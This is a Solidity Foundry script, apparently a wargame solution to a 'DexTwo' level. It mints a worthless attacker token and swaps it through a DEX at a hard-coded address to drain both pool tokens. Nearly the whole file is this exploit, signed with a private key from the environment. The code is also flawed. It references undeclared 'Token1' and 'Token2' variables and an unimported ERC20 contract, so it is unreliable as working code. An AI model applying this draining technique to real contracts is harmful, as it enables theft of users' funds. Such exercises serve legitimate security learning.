// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "src/23-DexTwo.sol"; 



contract AttackerToken is ERC20 {
    constructor() ERC20("AttackerToken", "hacksb") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}
//0x779f1AC87F490E0dD9C2D8d02877a696e570fbC2

contract Exp is Script {

    DexTwo public DexTwoInstance = DexTwo(payable(0xA1cf4B4742FDB23c59C4F7619e29541A7392fCef));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS"); 
    // Exploit public attackContract;
    IERC20 public token1;
    IERC20 public token2;
    AttackerToken public attackerToken;

    function attack() public {
        attackerToken = new AttackerToken();
        attackerToken.mint(address(this), 1000);
        attackerToken.approve(address(DexTwoInstance), type(uint256).max);
        DexTwoInstance.add_liquidity(address(attackerToken), 1000);

        Token1 = IERC20(DexTwoInstance.token1());
        DexTwoInstance.swap(address(attackerToken), address(Token1), attackerToken.balanceOf(address(this)));

        Token2 = IERC20(DexTwoInstance.token2());
        DexTwoInstance.swap(address(attackerToken), address(Token2), attackerToken.balanceOf(address(this)));
    }

    function run() external {
        vm.startBroadcast(hacker);
        attack();
        vm.stopBroadcast();
    }
}